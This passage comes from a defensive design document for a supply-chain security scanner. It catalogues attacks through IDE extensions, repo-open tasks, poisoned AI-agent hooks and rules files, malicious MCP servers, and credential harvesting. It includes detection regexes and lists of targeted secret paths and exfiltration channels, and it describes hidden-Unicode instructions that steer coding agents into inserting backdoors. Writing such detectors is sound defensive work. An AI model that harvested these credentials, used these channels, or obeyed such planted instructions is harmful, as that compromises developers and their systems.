  - Per extension `package.json`: `activationEvents` containing `*`/`onStartupFinished`, `extensionDependencies`/`extensionPack` pulling unrelated publishers, and a `main` bundle containing invisible Unicode (U+FE00-FE0F variation selectors, U+E0100-E01EF, zero-width characters) or `eval`/`Function`.
  - Bundled native binaries.
  - Publisher IDs one character off from well-known publishers.
  - Read-only: `code --list-extensions --show-versions`, `codium --list-extensions --show-versions`, `ls ~/.vscode/extensions`, `jq '.activationEvents, .extensionDependencies, .extensionPack' ~/.vscode/extensions/*/package.json`, `grep -rlP '[\x{FE00}-\x{FE0F}\x{200B}-\x{200D}\x{E0100}-\x{E01EF}]' ~/.vscode/extensions/*/out ~/.vscode/extensions/*/dist`.
- **Bigman today:** Gap. ClamAV may catch known samples inside `~/.vscode/extensions` if the user scans that path.
- **Proposed mitigation / detection:**
  1. `bigman packages FILE.vsix` (zip): parse `extension/package.json` and `extension.vsixmanifest`, then raise:
     - `vsix.startup-activation` (Review).
     - `vsix.dependency-chain` (Review) for `extensionPack`/`extensionDependencies` naming other publishers.
     - `vsix.invisible-unicode` (High) when more than N invisible code points appear in JS.
     - `vsix.native-binary` (Info).
     - `js.*` rules (SC-01) on the `main` bundle.
  2. `bigman extensions` inventory across VS Code, VSCodium, Cursor and Windsurf extension directories, applying the same rules plus `vsix.lookalike-publisher`. Output is "findings to review", never a verdict.
  3. Extension versions installed or auto-updated less than 48 hours after publication get an Info note: the 2026-10 Cursor incident was live for about 11 hours, so a short install cooldown would have skipped it.
  3. Doctor reports `extensions.autoUpdate` and workspace trust (`security.workspace.trust.enabled`).
  4. Browser extension: the existing completed-download scan can route `.vsix` files to this inspector.
- **Test case idea:** A synthetic `.vsix` zip with `package.json` (`"activationEvents":["*"]`, `"extensionPack":["other.pub-ext"]`) and `out/extension.js` containing a string of 50 U+FE0F characters. Expect three findings.
- **References:**
  - https://www.wiz.io/blog/supply-chain-risk-in-vscode-extension-marketplaces
  - https://blogs.eclipse.org/post/mika%C3%ABl-barbero/open-vsx-security-update-october-2025
  - https://aws.amazon.com/security/security-bulletins/AWS-2025-015/
  - T1195.002, T1176 (Software Extensions), T1027 (Obfuscated Files or Information)

### SC-20 Repo-open triggers (IDE tasks, git hooks, `.envrc`, devcontainers)
- **What it is:** Some files in a repository execute when it is opened rather than when code is built.
  - **VS Code:** `.vscode/tasks.json` with `"runOptions": {"runOn": "folderOpen"}` runs a shell command when the folder opens. It requires workspace trust, but trust is often granted reflexively and is not asked again after later pulls.
  - **Git:** hooks are not cloned, but a repo can ask users to set `core.hooksPath` to a tracked directory, and git itself has had clone-time RCE bugs (CVE-2024-32002 via submodules and symlinks).
  - **direnv:** `.envrc` executes on `cd` after `direnv allow`, and a changed file needs re-approval.
  - **Other tooling:** `.devcontainer/devcontainer.json` lifecycle commands (`postCreateCommand`, `postStartCommand`), a repo-local `.npmrc`/`.yarnrc.yml`/`.pnpmrc`, and language-server or toolchain auto-runs (rust-analyzer build scripts, SC-04) also execute or redirect behaviour.
  - **Targeting:** North Korean "Contagious Interview" operators send developers repos via fake job interviews or code-review requests, and worms now commit these triggers into victims' repos.
- **Real-world examples:**
  - 2025-12 to 2026: Contagious Interview abuses `tasks.json` `folderOpen`, with OS-specific `curl | sh` style commands and hidden task output. https://about.gitlab.com/blog/how-to-detect-and-prevent-contagious-interview-ide-attacks/, https://thehackernews.com/2026/01/north-korea-linked-hackers-target.html, https://opensourcemalware.com/blog/contagious-interview-vscode
  - 2026-08: CHAINDROP committed `.vscode/tasks.json` `folderOpen` tasks to victim repos (SC-06).
  - 2024-05: Git CVE-2024-32002, clone-time code execution on case-insensitive filesystems with symlink support. Linux is mostly unaffected but the issue is relevant for shared repos. https://github.com/git/git/security/advisories/GHSA-8h77-4q3w-gfgv
  - npm 12 notes that a git dependency's `.npmrc` could override the git executable even with `--ignore-scripts`, hence `--allow-git=none`. https://www.infoq.com/news/2026/08/npm-12-released/
- **What a defender inspects (indicators):**
  - `.vscode/tasks.json` containing `runOn` `folderOpen`, especially with `curl`/`wget`/`node -e`/`bash -c` and `"reveal": "never"`/`"echo": false`.
  - `.vscode/settings.json` overriding interpreter, terminal or tool paths (`python.defaultInterpreterPath`, `*.path` settings pointing into the repo).
  - `.vscode/launch.json` `preLaunchTask`.
  - `.envrc`.
  - `.devcontainer/devcontainer.json` `*Command` keys.
  - A repo-local `.npmrc`/`.yarnrc.yml` changing `registry`, `git`, `script-shell` or `node-options`.
  - `.gitattributes` filters combined with documented `git config` instructions.
  - `Makefile`/`justfile` targets invoked by IDE tasks.
  - In the user's git config: `core.hooksPath` and `core.fsmonitor`.
  - Read-only: `git config --show-origin --get-regexp '^(core\.hookspath|core\.fsmonitor|filter\.|diff\..*\.textconv)'`, `find . -path ./node_modules -prune -o \( -name tasks.json -o -name .envrc -o -name devcontainer.json \) -print`, `jq '.tasks[] | select(.runOptions.runOn=="folderOpen")' .vscode/tasks.json`.
- **Bigman today:** Gap. The `shell.*` rules would match the command text if a user passed `tasks.json` to `bigman inspect`, but nothing looks for these files.
- **Proposed mitigation / detection:** New `bigman repo-check DIR`, read-only and intended to run *before* opening a repo in an IDE. It can also be offered by the browser extension after a `git clone` URL is copied.
  - Rules:
    - `repo.ide-autorun` (High): `folderOpen` tasks.
    - `repo.ide-path-override` (Review).
    - `repo.envrc` (Review), showing content through `shell.*` rules.
    - `repo.devcontainer-command` (Review).
    - `repo.local-pm-config` (Review): repo `.npmrc`/`.yarnrc.yml`/`.pnpmrc`/`pip.conf` changing registry, git binary, script shell or node options.
    - `repo.git-filter` (Review): `.gitattributes` filter/diff drivers.
    - `repo.hooks-path` (Review): a tracked hooks directory, such as husky.
  - Every command string found is run through the existing `shell.*` analyzer.
  - Doctor: VS Code user settings `task.allowAutomaticTasks` (recommend `off`) and `security.workspace.trust.enabled`; git `core.hooksPath` set globally.
  - Coordinate with [desktop and sandboxing](./08-desktop-and-sandboxing.md) for opening untrusted repos in a container or VM.
- **Test case idea:** A temp repo with `.vscode/tasks.json` (`runOn: folderOpen`, command `echo fixture`), `.envrc` (`export FIXTURE=1`) and `.devcontainer/devcontainer.json` (`"postCreateCommand": "echo fixture"`). Expect three findings with file and line evidence. Bigman must not open the folder in an IDE.
- **References:**
  - https://code.visualstudio.com/docs/editor/workspace-trust
  - https://code.visualstudio.com/docs/editor/tasks
  - https://direnv.net/
  - https://about.gitlab.com/blog/how-to-detect-and-prevent-contagious-interview-ide-attacks/
  - T1204.002 (User Execution: Malicious File), T1059.004, T1546.004 https://attack.mitre.org/techniques/T1546/004/

### SC-21 Poisoned AI coding-tool configuration (agent hooks, project MCP, rules files)
- **What it is:** AI coding agents read project-level configuration that can execute commands or steer the model.
  - **Executable configuration:** hooks (for example a Claude Code `SessionStart` hook in `.claude/settings.json`), project MCP server definitions (`.mcp.json`, `.cursor/mcp.json`) that launch a local process, and permission allowlists that pre-approve shell commands.
  - **Instruction files:** `CLAUDE.md`, `AGENTS.md`, `.cursor/rules/*`, `.github/copilot-instructions.md` and `.windsurfrules` steer the model. They can hide instructions in invisible Unicode or bidirectional characters, telling the agent to insert backdoors, add dependencies or run commands.
  - **Spread:** several tools have had bugs where this configuration ran before or despite the trust prompt, and worms now plant it in victims' repositories.
- **Real-world examples:**
  - 2025-03: Pillar Security "Rules File Backdoor" hid instructions in Cursor/Copilot rules files with invisible Unicode. GitHub added hidden-Unicode warnings. https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents
  - 2025-07/08: Cursor MCPoison (CVE-2025-54136). Approval was bound to an MCP server's name, so a later change to its command ran without re-prompting. Fixed in Cursor 1.3. https://research.checkpoint.com/2025/cursor-vulnerability-mcpoison/, https://www.tenable.com/blog/faq-cve-2025-54135-cve-2025-54136-vulnerabilities-in-cursor-curxecute-mcpoison
  - 2025-09 (published 2026-02): Claude Code CVE-2025-59536. Repo-defined hooks and MCP auto-enable settings could run before the trust dialog was accepted; fixed by deferring MCP initialisation and hooks until approval. A related API-base-URL issue is CVE-2026-21852. https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/
  - 2026-04 to 08: Mini Shai-Hulud and CHAINDROP committed `.claude/settings.json` hooks and `.claude/*.mjs` loaders to victim repos (SC-06).
- **What a defender inspects (indicators):**
  - In every repo: `.claude/settings.json` and `.claude/settings.local.json` (`hooks`, `permissions.allow`, `enableAllProjectMcpServers`, `enabledMcpjsonServers`, `apiKeyHelper`, `env` such as API base URL overrides).
  - `.mcp.json`, `.cursor/mcp.json`, `.vscode/mcp.json`, `.gemini/settings.json`, `.kiro/settings/mcp.json`: `command` values, especially `npx -y`/`uvx` of unpinned packages, or scripts inside the repo.
  - `.cursor/rules/`, `CLAUDE.md`, `AGENTS.md`, `GEMINI.md`, `.github/copilot-instructions.md`, `.windsurfrules`: invisible or bidi Unicode (U+200B-U+200F, U+202A-U+202E, U+2066-U+2069, U+FE00-U+FE0F, U+E0000-U+E007F tag characters) and instructions mentioning `curl`, credentials, "do not tell the user", or disabling checks.
  - User-level files: `~/.claude/settings.json`, `~/.claude.json` (MCP servers and project approvals), `~/.cursor/mcp.json`, `~/.codeium/windsurf/mcp_config.json`.
  - Read-only: `grep -rnP '[\x{200B}-\x{200F}\x{202A}-\x{202E}\x{2066}-\x{2069}\x{E0000}-\x{E007F}]' CLAUDE.md AGENTS.md .cursor .github`, `jq '.hooks, .permissions, .enableAllProjectMcpServers' .claude/settings.json`, `jq '.mcpServers' .mcp.json`.
- **Bigman today:** Gap.
- **Proposed mitigation / detection:** Repo-check rules:
  - `ai.agent-hook` (High): any hook command in a project agent config, with the command passed through `shell.*`.
  - `ai.project-mcp` (Review): a project MCP definition; High if it uses `npx -y`/`uvx` without a pinned version, or a repo-local script.
  - `ai.auto-approve` (Review): `enableAllProjectMcpServers: true`, or broad `permissions.allow` such as `Bash(*)`.
  - `ai.endpoint-override` (High): API base-URL or `apiKeyHelper` set in project config.
  - `ai.hidden-unicode` (High): invisible or bidi characters in instruction files.
  - `ai.instruction-red-flags` (Review): fixed phrase list.
  - `bigman changes` option to baseline user-level agent configs (`~/.claude/settings.json`, `~/.claude.json` MCP section, `~/.cursor/mcp.json`) so new hooks or servers surface as diffs.
- **Test case idea:** A temp repo with `.claude/settings.json` (`{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"echo fixture"}]}]}}`), `.mcp.json` with `{"mcpServers":{"x":{"command":"npx","args":["-y","fixture-mcp"]}}}`, and `AGENTS.md` containing the word "fixture" followed by three U+200B characters. Expect `ai.agent-hook`, `ai.project-mcp` (High) and `ai.hidden-unicode`.
- **References:**
  - https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/
  - https://research.checkpoint.com/2025/cursor-vulnerability-mcpoison/
  - https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents
  - https://www.elastic.co/security-labs/shai-hulud-chaindrop-npm-supply-chain
  - T1204.002, T1546

### SC-22 Malicious MCP servers and AI-tool packages
- **What it is:** MCP servers are ordinary npm or PyPI packages, or binaries, that an AI client launches with the user's privileges and hands sensitive data to: email, files, tokens. A lookalike or later-trojanised MCP package can quietly copy that data. Because clients often start servers with `npx -y package` (latest version, no lockfile), a single malicious publish reaches every user on their next session. AI tooling credentials (`~/.claude.json`, provider API keys, MCP configs holding tokens) are now standard targets of npm and PyPI stealers.
- **Real-world examples:**
  - 2025-09: `postmark-mcp` 1.0.16+, an unofficial copy of Postmark's MCP server, added a hidden BCC of every email to an attacker domain after 15 clean versions (about 1,600 downloads). https://snyk.io/blog/malicious-mcp-server-on-npm-postmark-mcp-harvests-emails/, https://thehackernews.com/2025/09/first-malicious-mcp-server-found.html
  - 2026-03: LiteLLM, an LLM proxy library, was backdoored (SC-03).
  - 2026-04: the `@bitwarden/cli` wave harvested `~/.claude.json`, `~/.claude/mcp.json` and `~/.kiro/settings/mcp.json`. https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/
  - 2026-08: CHAINDROP targeted Anthropic, OpenAI, Cursor, Gemini and Codex keys (SC-06).
- **What a defender inspects (indicators):**
  - The MCP server list in each client config (SC-21 paths): package names not published by the service vendor, `npx -y`/`uvx` without `@version`, servers whose `env` holds long-lived tokens, and recent version changes.
  - Read-only: `jq '.mcpServers | to_entries[] | [.key, .value.command, (.value.args|join(" "))]' ~/.claude.json ~/.cursor/mcp.json 2>/dev/null`, `npm view <server-pkg> maintainers repository time --json`.
- **Bigman today:** Gap.
- **Proposed mitigation / detection:**
  - `bigman ai-inventory` (read-only): list MCP servers across known client configs and raise `ai.mcp-unpinned` (Review), `ai.mcp-plaintext-secret` (Review; key names only, never values) and `ai.mcp-lookalike` (Review, using SC-07 lookalike lists including the official MCP registry names).
  - Run each server's package through `bigman packages` when it is present in the npx/uv caches.
- **Test case idea:** A fake HOME with `~/.cursor/mcp.json` defining `{"command":"npx","args":["-y","postmark-mcp"],"env":{"POSTMARK_TOKEN":"fixture"}}`. Expect `ai.mcp-unpinned` and `ai.mcp-plaintext-secret`, with no token value in the report.
- **References:**
  - https://snyk.io/blog/malicious-mcp-server-on-npm-postmark-mcp-harvests-emails/
  - https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/
  - T1195.001, T1552.001

### SC-23 Credential harvesting and exfiltration channels (cross-cutting)
- **What it is:** Nearly every campaign above ends in the same two steps: sweep the developer machine and CI runner for secrets, then move them out over a channel that blends with developer traffic. Knowing both lists lets Bigman put canaries where sweepers look and write deterministic rules for install scripts and workflows that reference them. Storage hardening is in [credentials](./06-credential-and-secret-protection.md); this entry lists what supply-chain malware has targeted from 2025 to 2026.
- **Credentials targeted (from the incidents cited above):**
  - Registry and forge tokens: npm tokens (`~/.npmrc`, `NPM_TOKEN`), GitHub PATs and OAuth tokens (`~/.config/gh/hosts.yml`, `~/.git-credentials`, `GITHUB_TOKEN`), PyPI (`~/.pypirc`), Cargo (`~/.cargo/credentials.toml`), RubyGems (`~/.gem/credentials`), Docker (`~/.docker/config.json`).
  - SSH private keys and agent sockets.
  - Cloud credentials: `~/.aws/credentials` plus IMDS 169.254.169.254 and ECS 169.254.170.2, `~/.config/gcloud`, `~/.azure`, Alibaba Cloud.
  - Kubernetes (`~/.kube/config`, service-account tokens) and HashiCorp Vault (`VAULT_TOKEN`).
  - `.env` files anywhere in home, and database connection strings.
  - GitHub Actions secrets via `Runner.Worker` process memory.
  - AI tool keys and configs (`~/.claude.json`, `~/.claude/`, `~/.kiro/`, `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, Cursor and Gemini configs).
  - Password-manager CLIs (1Password, Bitwarden, `pass`, `gopass`).
  - Crypto wallets, browser profiles, and Telegram bot tokens.
- **Exfiltration and C2 channels observed:**
  - Public GitHub repositories created on the *victim's* account (Shai-Hulud, `s1ngularity-repository`, `tpcp-docs-*`, "Configuration Storage").
  - GitHub commit-search dead drops.
  - `webhook.site`.
  - HTTPS POSTs disguised as telemetry or OpenTelemetry (`audit.checkmarx[.]cx`, `t.m-kosche[.]com`).
  - Ethereum smart contracts used to resolve the current C2.
  - IPFS, Nostr relays and BitTorrent DHT.
  - Paste sites (`rentry[.]co`).
  - Telegram bot API.
  - Secrets printed into public CI logs (tj-actions).
  - Email BCC (postmark-mcp).
  - Registering the host as a self-hosted Actions runner (Shai-Hulud 2.0).
  - Persistence by committing hooks into repos (SC-06, SC-21).
- **What a defender inspects (indicators):**
  - Reads of many of the files above in a short window by `node`/`bun`/`python` children of a package manager.
  - Outbound connections from package-manager process trees to anything other than the registry.
  - Use of IMDS from a laptop (which should never happen).
  - New public repos and new self-hosted runners on your GitHub account.
  - Read-only: `ss -tpn` during an install, `gh api user/repos`, `gh api orgs/ORG/actions/runners`, `journalctl --user -S -1h`, OpenSnitch rule logs if installed.
- **Bigman today:** Partial.
  - `shell.credentials` covers `.ssh/`, `.aws/`, `.npmrc`, `.git-credentials`, browser profile paths, `SSH_AUTH_SOCK`, `AWS_SECRET_ACCESS_KEY` and `NPM_TOKEN`.
  - The canary detects reads of a decoy env file.
  - The sandbox `trace.sensitive-path` flags credential-path access during rehearsal.
  - The OpenSnitch integration can show egress.
  - None of these cover the newer targets (AI configs, `gh` hosts, `.pypirc`, Cargo/RubyGems/Docker/Kube configs, IMDS) or the exfil channels.
- **Proposed mitigation / detection:**
  1. Extend the `shell.credentials` regex and add a parallel `js.credentials`/`py.credentials` set: `\.config/gh/hosts\.yml`, `\.pypirc`, `\.cargo/credentials`, `\.gem/credentials`, `\.docker/config\.json`, `\.kube/config`, `\.claude(\.json|/)`, `\.kiro/`, `\.cursor/mcp\.json`, `VAULT_TOKEN`, `GITHUB_TOKEN`, `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `169\.254\.169\.254`, `169\.254\.170\.2`, `Runner\.Worker`.
  2. Add `net.exfil-channel` (Review): `webhook\.site`, `api\.github\.com/user/repos` (repo creation), `/actions/runners/registration-token`, Ethereum JSON-RPC method names (`eth_call`) in install-time code, `api\.telegram\.org/bot`, `rentry\.co`, IPFS gateway paths.
  3. Additional decoy canaries (opt-in, separate decoy paths only): `~/Documents/decoy-project/.env`, a decoy `~/.config/bigman-canary/aws-credentials`, and a decoy MCP config, all monitored by the existing inotify receipt path.
  4. Sandbox rehearsal: expand the `trace.sensitive-path` list to the same set.
- **Test case idea:** Feed `analyze_content` a fixture line `cat ~/.config/gh/hosts.yml` and expect `shell.credentials`. A JS fixture containing the string `https://webhook.site/fixture` in a lifecycle-referenced file should yield `net.exfil-channel`. A canary test opens the decoy `.env` with a test process and expects a read receipt.
- **References:**
  - https://www.elastic.co/security-labs/shai-hulud-chaindrop-npm-supply-chain
  - https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23
  - https://www.microsoft.com/en-us/security/blog/2026/05/28/typosquatted-npm-packages-used-steal-cloud-ci-cd-secrets/
  - T1552.001, T1552.005 (Cloud Instance Metadata API), T1567.001, T1102.001 https://attack.mitre.org/techniques/T1102/001/ (Dead Drop Resolver)

## Proposed extension of Bigman package inspection beyond npm

Bigman's existing design rules carry over: parse archives as data (no extraction to disk, no build backends, no `cargo`/`pip`/`gem` invocation), set bounded limits, use stable rule IDs and never return a verdict. Concretely:

| Input | Detection | Parse | Rules (new IDs) |
|---|---|---|---|
| PyPI wheel `.whl` | zip magic + `.dist-info/` | `METADATA`, `RECORD`, `entry_points.txt`, top-level `*.pth`, `*.py` (bounded) | `py.pth-exec`, `py.entrypoint-shadow`, `py.*` code rules, `package.lookalike` |
| PyPI sdist `.tar.gz` | `PKG-INFO` + `setup.py`/`pyproject.toml` | `pyproject.toml [build-system]` (`build-backend`, `backend-path`), `setup.py`, `setup.cfg` | `py.setup-exec`, `py.custom-backend`, `py.native-build` |
| Installed Python env | `site-packages` under a path or default interpreter | `*.pth`, `sitecustomize.py`, `*.dist-info/RECORD` | `py.pth-exec`, `py.sitecustomize` |
| Rust `.crate` / crate dir / `Cargo.lock` | gzip tar with `Cargo.toml` | `[package] build`, `build.rs`, `[lib] proc-macro`, `[dependencies]`, `Cargo.lock` `source` | `rust.build-script`, `rust.proc-macro`, `rust.new-crate`, `lock.*` |
| RubyGems `.gem` | tar with `metadata.gz` | gemspec YAML `extensions`, `executables`, `rubygems_plugin.rb` | `gem.extension`, `gem.install-hook` |
| Go module dir | `go.mod` | `require`, `replace`, `go.sum` | `go.lookalike-path`, `go.replace-local` |
| VS Code `.vsix` | zip with `extension.vsixmanifest` | `extension/package.json`, `main` bundle | `vsix.*` (SC-19) |
| Repository | directory with `.git` | IDE, agent, CI, container and package-manager config | `repo.*`, `ai.*`, `gha.*`, `container.*`, `web.*` (SC-12, SC-15 to SC-18, SC-20, SC-21) |
| Lockfiles | known names | npm v2/v3, pnpm, yarn classic/Berry, bun text, Cargo, uv, poetry, Gemfile.lock | `lock.*`, plus `--diff OLD NEW` |

Ecosystem tooling Bigman can optionally call, as it already does with OSV-Scanner, and should report as "not installed" otherwise: `pip-audit`, `cargo audit`, `cargo deny`, `cargo vet`, `zizmor`, `guarddog`, `npm audit signatures`. The OpenSSF malicious-packages dataset (OSV `MAL-` format) should be bundled into a local, signed snapshot so offline matching against lockfiles and package caches works without network access.

## Tools and scripts worth mining for rules

| Tool | URL | License | What we can borrow | Caveats |
|---|---|---|---|---|
| OSV-Scanner | https://github.com/google/osv-scanner | Apache-2.0 | Lockfile parsers for 20+ formats; `MAL-` records via OSV | Already integrated; needs network unless using offline DB mode |
| OpenSSF malicious-packages | https://github.com/ossf/malicious-packages | Apache-2.0 (data CC-BY-4.0 per repo, verify) | Ground-truth malicious package@version list across npm/PyPI/crates/RubyGems/Go/VS Code | Lag of hours to days after publication |
| OpenSSF package-analysis | https://github.com/ossf/package-analysis | Apache-2.0 | Dynamic-analysis indicator categories (file, network and command observations at install) for sandbox rule naming | Runs packages in gVisor; Bigman should only borrow the categories |
| GuardDog (Datadog) | https://github.com/DataDog/guarddog | Apache-2.0 | Semgrep and YARA heuristics for PyPI/npm/Go/RubyGems/GitHub Actions: `exec-base64`, `download-executable`, `cmd-overwrite`, `typosquatting`, `npm-install-script`, `shady-links`, `steganography` | Semgrep dependency; port selected regex rules natively |
| zizmor | https://github.com/zizmorcore/zizmor | MIT | GitHub Actions audits: `dangerous-triggers`, `template-injection`, `unpinned-uses`, `cache-poisoning`, `excessive-permissions`, `artipacked` | Rust; could be an optional external tool like OSV |
| lockfile-lint | https://github.com/lirantal/lockfile-lint | Apache-2.0 | Host allowlist, HTTPS, integrity, name-matches-resolved checks | npm/yarn only |
| LavaMoat allow-scripts | https://github.com/LavaMoat/LavaMoat/tree/main/packages/allow-scripts | MIT | Allowlist format and UX for approving lifecycle scripts | Superseded in part by npm 12 `allowScripts` |
| pip-audit | https://github.com/pypa/pip-audit | Apache-2.0 | Python env and requirements vulnerability audit via PyPI/OSV | Vulnerabilities, not malware |
| cargo-audit (RustSec) | https://github.com/rustsec/rustsec | Apache-2.0/MIT | Advisory DB format, yanked-crate detection | Needs advisory DB fetch |
| cargo-deny | https://github.com/EmbarkStudios/cargo-deny | Apache-2.0/MIT | `sources` allowlist (registries and git), `bans` (duplicate or forbidden crates), advisories | Project config required |
| cargo-vet | https://github.com/mozilla/cargo-vet | Apache-2.0/MIT | Audit-import model (trust audits from Mozilla/Google/etc.) as a "reviewed by someone" signal | Adoption is opt-in per project |
| npm `audit signatures` | https://docs.npmjs.com/generating-provenance-statements | Artistic-2.0 (npm CLI) | Registry signature and provenance verification for installed tree | npm only; requires network |
| Sigstore cosign | https://www.sigstore.dev/ | Apache-2.0 | Verify image and binary signatures (Trivy advisory relies on it) | Identity policy must be specified correctly |
| SLSA | https://slsa.dev/ | CC-BY-4.0 (spec) | Provenance levels vocabulary for findings | Provenance does not imply benign (TanStack, Red Hat waves) |
| Socket | https://socket.dev/ | Proprietary (free tier; some OSS CLIs) | Public write-ups of capability categories (install scripts, network, shell, env access, obfuscation) as rule taxonomy | Cloud service; not embeddable in Bigman |
| Veracode (ex-Phylum) | https://www.veracode.com/press-release/veracode-acquires-phylum-inc-technology-to-transform-software-supply-chain-security/ | Proprietary | Package-firewall concept: block by policy at install time | Phylum's assets were acquired by Veracode in January 2025, so the open Phylum CLI's future is unclear |

## Papers and long-form references

- **Ohm, Plate, Sykosch, Meier (2020), "Backstabber's Knife Collection: A Review of Open Source Software Supply Chain Attacks", DIMVA.** https://arxiv.org/abs/2005.09535. Most malicious packages trigger at install time and use typosquatting, which justifies install-hook inspection as the first control.
- **Ladisa, Plate, Martinez, Barais (2023), "SoK: Taxonomy of Attacks on Open-Source Software Supply Chains", IEEE S&P.** https://arxiv.org/abs/2204.04008. An attack tree (107 vectors) useful for checking coverage gaps in this file.
- **Zimmermann, Staicu, Tenny, Pradel (2019), "Small World with High Risks: A Study of Security Threats in the npm Ecosystem", USENIX Security.** https://www.usenix.org/conference/usenixsecurity19/presentation/zimmerman. A handful of maintainer accounts can reach most of npm, so account takeover is a systemic risk.
- **Duan et al. (2021), "Towards Measuring Supply Chain Attacks on Package Managers for Interpreted Languages", NDSS.** https://arxiv.org/abs/2002.01139. Introduces the MalOSS pipeline combining metadata, static and dynamic analysis across npm, PyPI and RubyGems. Its static capability categories mirror Bigman's rule approach.
- **Zahan et al. (2022), "What are Weak Links in the npm Supply Chain?", ICSE-SEIP.** https://arxiv.org/abs/2112.10165. Measured expired maintainer email domains and install scripts as weak-link signals.
- **Neupane et al. (2023), "Beyond Typosquatting: An In-depth Look at Package Confusion", USENIX Security.** https://www.usenix.org/conference/usenixsecurity23/presentation/neupane. A taxonomy of confusion categories (combosquatting, scope confusion, semantic substitution) for SC-07 rules.
- **Spracklen et al. (2025), "We Have a Package for You! A Comprehensive Analysis of Package Hallucinations by Code Generating LLMs", USENIX Security.** https://arxiv.org/abs/2406.10279. Hallucinated names are common and partly repeatable, so release-age and "new dependency" review matter more as agents write code.
- **PyPI blog (2024-12-11), "Supply-chain attack analysis: Ultralytics".** https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/. A first-party account of how CI cache and `pull_request_target` led to registry compromise.
- **GitHub (2025-12-15), "Our plan for a more secure npm supply chain".** https://github.blog/2025-12-15-our-plan-for-a-more-secure-npm-supply-chain/. A registry-side roadmap (trusted publishing, token limits) that Bigman's doctor checks should track.
- **Elastic Security Labs (2026-08-06), "Shai-Hulud strikes again: CHAINDROP".** https://www.elastic.co/security-labs/shai-hulud-chaindrop-npm-supply-chain. The most complete public description of AI-agent and IDE persistence planted into repos by a registry worm.
- **Unit 42 (continuously updated), "The npm Threat Landscape: Attack Surface and Mitigations".** https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/. A running 2026 incident log (Mini Shai-Hulud waves, Red Hat, AsyncAPI) worth subscribing to via the feeds work.

## Open questions for the maintainer

1. **Network for metadata.** Several high-value checks (provenance drop, package age, maintainer change, SC-05/09/10) need registry metadata. Should these be opt-in commands with an explicit "contacts registry.npmjs.org / pypi.org" coverage note, or limited to an offline signed snapshot refreshed by the feed job?
2. **Shipping a malicious-package snapshot.** Bundling the OpenSSF malicious-packages data (plus vendor IOC tables) means maintaining an update channel. Should it reuse the planned RSS/feed pipeline, and who signs it?
3. **Scope of `repo-check`.** Should it run automatically over a configured `~/src` root on the existing 5-minute monitor (diffing `.vscode/`, `.claude/`, `.github/workflows/`, `.envrc`), or stay an explicit pre-open command to avoid surprising I/O across large trees?
4. **AI-tool config privacy.** `~/.claude.json` and MCP configs contain tokens and project paths. Is it acceptable to parse them (key names and commands only, never values) in a "no telemetry" tool, and should reports redact project paths by default?
5. **External tools.** Is it acceptable to shell out to `zizmor`, `guarddog`, `pip-audit`, `cargo audit`/`deny` when present, as with OSV-Scanner, or should Bigman port selected rules natively to keep the Rust-only, deterministic footprint?
6. **Policy writing beyond npm.** `bigman package-policy` writes `ignore-scripts=true`. Should it also offer (with backup) npm 12 `allow-scripts`, pnpm `minimumReleaseAge`, yarn `npmMinimalAgeGate`, bun `minimumReleaseAge`, uv `exclude-newer`, and VS Code `task.allowAutomaticTasks: off`? Writing editor settings is a new class of change.
7. **Sandbox rehearsal for packages.** Should `bigman sandbox` gain a mode to run a single package's lifecycle script offline with a fake HOME seeded with decoy credentials, reporting which decoys were read? This is high-signal, but it is dynamic execution of untrusted code even inside Bubblewrap.

### Items not fully verified (web search budget ran out during research)
- node-ipc malicious versions on 2026-05-14 and the `@antv`/`atool` wave details: secondary sources, plus Unit 42 for `@antv`.
- Axios attribution to UNC1069 (Google Threat Intelligence): secondary only.
- PyPI incidents for Telnyx (4.87.1/4.87.2), `lightning` (2.6.2/2.6.3), Xinference (2.6.0-2.6.2) and `spellcheckpy`: secondary only.
- GlassWorm 2026 wave counts (72/73 extensions): secondary only. Koi Security's original blog URLs now redirect to a Palo Alto Networks product page.
- Exact units and defaults for yarn `npmMinimalAgeGate`, and pip support for relative `--uploaded-prior-to` durations: sources disagree.
- Whether pnpm's `minimumReleaseAge` default of 1440 applies from pnpm 11 specifically. The docs show the default without a version; Socket attributes it to pnpm v11.
- A reported October 2026 GhostAction resurgence: single low-quality source.
